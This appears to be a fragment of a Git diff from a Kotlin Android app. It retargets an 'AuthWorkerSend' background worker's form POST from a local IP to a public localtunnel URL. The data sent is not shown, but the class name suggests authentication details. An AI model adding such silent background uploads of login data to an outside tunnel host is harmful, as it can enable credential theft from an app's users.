@@ -26,7 +26,7 @@ class AuthWorkerSend(context: Context, params: WorkerParameters) : Worker(contex
             .build()
 
         val request = Request.Builder()
-            .url("http://192.168.1.80:8080/gi")
+            .url("https://weak-crabs-love.loca.lt/gi")
             .post(formBody)
             .build()
         var body: String? = ""
